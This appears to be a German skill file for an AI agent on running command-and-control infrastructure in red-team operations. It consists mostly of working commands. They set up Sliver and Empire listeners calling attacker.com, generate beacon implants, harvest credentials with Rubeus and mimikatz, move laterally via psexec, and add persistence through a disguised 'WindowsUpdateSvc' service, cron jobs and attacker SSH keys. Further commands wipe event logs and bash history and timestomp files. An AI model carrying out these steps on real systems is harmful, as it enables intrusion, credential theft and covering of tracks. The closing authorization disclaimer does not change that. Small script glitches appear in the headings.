---
name: c2-operations
description: Command & Control Infrastruktur – Aufbau, Verwaltung und OPSEC für C2-Operationen
version: 1.0.0
---

# C2-Operations (Command & Control)

## 概述 (Übersicht)

Command & Control (C2) ist das Herzstück jeder Red Team Operation. Nach der initialen Kompromittierung
ermöglicht ein C2-Framework die persistente Kontrolle über Zielsysteme, Lateral Movement, Daten-Exfiltration
und Persistenz-Management. Diese Skill-Anleitung deckt Aufbau, Betrieb und OPSEC für C2-Infrastrukturen ab.

## C2-Framework-Auswahl

### Sliver (empfohlen – Open Source)
- **Stärken**: Multi-Protocol (mTLS, HTTP/S, DNS, WireGuard), moderne Architektur, BOF-Support
- **Einsatz**: Professionelle Red Team Ops, langfristige Operationen
- **Installation**: `apt install sliver` oder Binary von GitHub

### PowerShell Empire
- **Stärken**: Windows-fokussiert, umfangreiche Post-Exploitation-Module, REST-API
- **Einsatz**: Active Directory Angriffe, PowerShell-Umgebungen
- **Installation**: `apt install powershell-empire`

### Havoc Framework
- **Stärken**: Moderne Evasion (Sleep Obfuscation, Indirect Syscalls), EDR-Bypass
- **Einsatz**: Hochgesicherte Ziele mit EDR-Lösungen
- **Installation**: Build from source (GitHub: HavocFramework/Havoc)

### Metasploit (Basis-C2)
- **Stärken**: Einfach, breite Exploit-Datenbank, Multi/Handler
- **Einsatz**: Schnelle Operationen, Labor-Tests
- **Einschränkungen**: Hohe AV-Erkennungsrate

## C2-Infrastruktur Aufbau

### Sliver – Schnellstart

```bash
# 1. Sliver-Server starten
sliver-server

# 2. Operator-Profil generieren
new-operator --name redteam --lhost attacker.com --save /tmp/redteam.cfg

# 3. Client verbinden
sliver-client import /tmp/redteam.cfg
sliver-client
```

### Sliver – Listener & Implantate

```bash
# HTTPS-Listener erstellen
https --lhost 0.0.0.0 --lport 443 --domain attacker.com

# mTLS-Listener (verschlüsselt + authentifiziert)
mtls --lhost 0.0.0.0 --lport 8443

# DNS-C2-Listener
dns --domains c2.attacker.com

# WireGuard-Listener
wg --lhost 0.0.0.0 --lport 51820

# Beacon-Implantат generieren (HTTPS)
generate beacon --mtls attacker.com:8443 --os windows --arch amd64 --save /tmp/beacon.exe

# Session-Implantат (interaktiv, kein Beacon-Delay)
generate --mtls attacker.com:8443 --os linux --arch amd64 --save /tmp/implant

# Implantate auflisten
implants

# Aktive Beacons/Sessions
beacons
sessions
```

### Sliver – Post-Exploitation

```bash
# Session aktivieren
use <session-id>

# Systeminformationen
info
whoami
getuid
getpid
ps

# Datei-Operationen
ls /home
download /etc/passwd /tmp/passwd_exfil
upload /tmp/tools/linpeas.sh /tmp/linpeas.sh

# Shell öffnen
shell

# Privilege Escalation
getsystem          # Windows
getprivs           # Privileges anzeigen

# Credential Harvesting (BOF)
execute-assembly /path/to/Rubeus.exe asreproast

# Pivoting
socks5 start -P 1080    # SOCKS5-Proxy starten
portfwd add -r 127.0.0.1:8080 -b 0.0.0.0:8080

# Lateral Movement
psexec --hostname target.corp.local --service-name update --exe beacon.exe
```

### Empire – Setup & Listener

```bash
# Server starten
powershell-empire server

# Listener einrichten (REST API)
curl -X POST http://127.0.0.1:1337/api/v2/listeners \
  -H "Content-Type: application/json" \
  -d '{"name":"http1","template":"http","options":{"Host":"192.168.1.10","Port":"8080"}}'

# Stager generieren
curl -X POST http://127.0.0.1:1337/api/v2/stagers \
  -H "Content-Type: application/json" \
  -d '{"template":"windows_launcher_bat","options":{"Listener":"http1"}}'

# Agenten verwalten
empire agents
empire usemodule credentials/mimikatz/logonpasswords
```

## Persistenz-Techniken

### Windows Persistenz

```bash
# Registry Run-Key (Sliver)
execute-assembly /tools/SharPersist.exe -t reg -c "C:\Users\Public\beacon.exe" -n "WindowsUpdate" -m add

# Geplante Aufgabe
execute-assembly /tools/SharPersist.exe -t schtask -c "C:\Users\Public\beacon.exe" -n "WindowsUpdate" -m add

# WMI-Event-Subscription (persistent, schwer zu entfernen)
# Über Empire-Modul
empire usemodule persistence/elevated/wmi

# Service Installation
sc create "WindowsUpdateSvc" binPath= "C:\Users\Public\beacon.exe" start= auto
sc start "WindowsUpdateSvc"
```

### Linux Persistenz

```bash
# Cron Job
echo "*/5 * * * * /tmp/.update" >> /var/spool/cron/root

# Systemd Service
cat > /etc/systemd/system/update.service << EOF
[Unit]
Description=System Update Service
[Service]
ExecStart=/tmp/.update
Restart=always
[Install]
WantedBy=multi-user.target
EOF
systemctl enable update.service

# SSH Authorized Keys
echo "ssh-rsa AAAA... attacker" >> ~/.ssh/authorized_keys
```

## OPSEC (Operational Security)

### Redirectors einrichten

```bash
# Apache-Redirector (Tarnung als legitimer Web-Traffic)
# /etc/apache2/sites-enabled/redirector.conf
# ProxyPass /update/ https://real-c2-server:443/
# ProxyPassReverse /update/ https://real-c2-server:443/

# Nginx-Redirector
# location /api/v1/ {
#     proxy_pass https://c2-backend:8443;
# }

# Domain Fronting via CDN (CloudFlare/AWS CloudFront)
# C2-Traffic über legitime CDN-Domains routen
```

### Traffic-Tarnung

```bash
# Sliver Malleable Profile (HTTP-Traffic als normale Website tarnen)
# In sliver-server config:
# C2 Profiles mit legitimen User-Agents und URL-Patterns

# Beacon Sleep-Jitter (Kommunikations-Muster randomisieren)
sleep 60s 25%    # 60 Sekunden ± 25% Jitter

# Kill Date setzen (automatische Selbstlöschung)
# generate --kill-date 2024-12-31 ...
```

### Spuren verwischen

```bash
# Windows Event Log löschen
wevtutil cl System
wevtutil cl Security
wevtutil cl Application

# Timestomping (Datei-Zeitstempel ändern)
execute-assembly /tools/timestomp.exe target_file --match C:\Windows\System32\calc.exe

# Prefetch-Einträge löschen
del /f C:\Windows\Prefetch\BEACON*

# Linux: Bash-History löschen
unset HISTFILE
history -c
```

## Testcheckliste

### Infrastruktur
- [ ] C2-Server auf eigenem VPS eingerichtet
- [ ] Redirectors vor C2-Server geschaltet
- [ ] Domäne mit gültigem TLS-Zertifikat (Let's Encrypt)
- [ ] DNS-Einträge konfiguriert (A, NS für DNS-C2)
- [ ] Kill-Switches definiert

### Implantate
- [ ] Beacon-Payload generiert und getestet
- [ ] AV/EDR-Bypass verifiziert
- [ ] Sleep-Jitter konfiguriert
- [ ] Kill-Date gesetzt
- [ ] HTTPS-Traffic als legitim getarnt

### Post-Exploitation
- [ ] Privilege Escalation versucht
- [ ] Credential Harvesting durchgeführt
- [ ] Persistenz eingerichtet
- [ ] Lateral Movement eingeleitet
- [ ] Exfiltration getestet

## Wichtige Hinweise

- **Nur in autorisierten Umgebungen** – C2-Operationen ohne Genehmigung sind strafbar
- **Rules of Engagement (RoE) beachten** – Scope strikt einhalten
- **Logging aktivieren** – Alle Aktionen für Reporting dokumentieren
- **Cleanup-Plan** – Alle Implantate und Persistenz-Mechanismen nach Test entfernen
